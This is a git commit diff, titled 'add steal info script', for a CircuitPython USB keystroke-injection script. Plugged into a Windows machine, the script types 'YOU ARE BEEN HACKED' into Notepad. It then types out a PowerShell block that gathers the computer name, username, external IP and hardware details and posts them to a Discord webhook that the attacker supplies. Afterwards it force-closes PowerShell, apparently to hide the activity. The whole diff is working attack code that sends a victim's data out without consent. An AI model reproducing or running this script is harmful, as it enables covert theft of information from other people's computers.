94ca7e08679a633b912f2c4b4e80fb0baf478f20
yimang <lucasbbtung@gmail.com>
2024-10-21 21:23:42 +0800

    add steal info script

--- Steal_Info.py
+++ Steal_Info.py
@@ -2,8 +2,8 @@
 # 縮小所有視窗，開啟記事本並打上"YOU ARE BEEN HACKED"
 # 然後透過powershell利用discord webhook傳送電腦硬體資訊/IP地址
 # 最後關閉所有powershell視窗
-# !!注意!! 這個腳本預設了打開powershell時是中文輸入法，所以會按一下shift，如果想要更改請把第62行刪除
-#記得在第68行放入自己的webhook url
+# !!注意!! 這個腳本在開啟powershell之前會自動切換另一個語言的輸入法，所以如果你有多個輸入法的話可能會出錯
+#記得在第65行放入自己的webhook url
 
 import time
 import usb_hid
@@ -51,21 +51,26 @@ time.sleep(0.2)
 kbd.release(Keycode.CONTROL)
 time.sleep(0.3)
 layout.write("YOU ARE BEEN HACKED", delay = 0.1)
-
-open("powershell")
-time.sleep(1)
-layout.write("Get-Process PowerShell | Stop-Process -Force", delay = 0.05)
-time.sleep(0.3)
-kbd.send(Keycode.ENTER)
-time.sleep(1)
-open("powershell")
-time.sleep(1)
+time.sleep(0.5)
+kbd.press(Keycode.ALT)
+time.sleep(0.1)
 kbd.send(Keycode.SHIFT)
+time.sleep(0.1)
+kbd.release(Keycode.ALT)
 time.sleep(0.5)
 
+open("powershell")
+time.sleep(3)
 powershell_script = '''
 $webhookUrl = "webhook url"
 $externalIp = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
+$gpuInfo = Get-WmiObject -Class Win32_VideoController | ForEach-Object {
+    @{
+        Name = $_.Name
+        AdapterRAM = [math]::round($_.AdapterRAM / 1MB, 2)
+        DriverVersion = $_.DriverVersion
+    }
+}
 $deviceInfo = @{
     ComputerName = $env:COMPUTERNAME
     Username = $env:USERNAME
@@ -73,7 +78,7 @@ $deviceInfo = @{
     CPU = (Get-WmiObject -Class Win32_Processor).Name
     RamGB = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
     IPAddress = $externalIp.IP
-    GPU = (Get-WmiObject -Class Win32_VideoController | Select-Object -First 1).Name
+    GPU = $gpuInfo
     HardDrives = Get-WmiObject -Class Win32_DiskDrive | ForEach-Object {
         @{
             Model = $_.Model
@@ -88,17 +93,36 @@ $deviceInfo = @{
         }
     }
 }
+$deviceInfoFormatted = "DEVICE INFO:`n" +
+                       "Computer Name: $($deviceInfo.ComputerName)`n" +
+                       "Username: $($deviceInfo.Username)`n" +
+                       "OS: $($deviceInfo.OS)`n" +
+                       "CPU: $($deviceInfo.CPU)`n" +
+                       "RAM (GB): $($deviceInfo.RamGB)`n" +
+                       "External IP: $($deviceInfo.IPAddress)`n" +
+                       "GPU:`n"
+foreach ($gpu in $deviceInfo.GPU) {
+    $deviceInfoFormatted += "  - Name: $($gpu.Name), Adapter RAM (MB): $($gpu.AdapterRAM), Driver Version: $($gpu.DriverVersion)`n"
+}
+$deviceInfoFormatted += "Hard Drives:`n"
+foreach ($drive in $deviceInfo.HardDrives) {
+    $deviceInfoFormatted += "  - Model: $($drive.Model), Size (GB): $($drive.SizeGB)`n"
+}
+$deviceInfoFormatted += "Monitors:`n"
+foreach ($monitor in $deviceInfo.Monitors) {
+    $deviceInfoFormatted += "  - Name: $($monitor.Name), Resolution: ${($monitor.ScreenWidth)}x${($monitor.ScreenHeight)}`n"
+}
 $deviceInfoMessage = @{
-    content = "DEVICE INFO:\n" + ($deviceInfo | ConvertTo-Json -Depth 4)
+    content = $deviceInfoFormatted
 }
 $jsonMessage = $deviceInfoMessage | ConvertTo-Json
 $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"
 $response
 '''
 for line in powershell_script.splitlines():
-    layout.write(line, delay = 0.05)
+    layout.write(line, delay = 0.04)
     kbd.send(Keycode.ENTER)
-    time.sleep(0.5)
+    time.sleep(0.3)
 time.sleep(1)
 layout.write("Get-Process PowerShell | Stop-Process -Force", delay = 0.05)
 time.sleep(0.3)
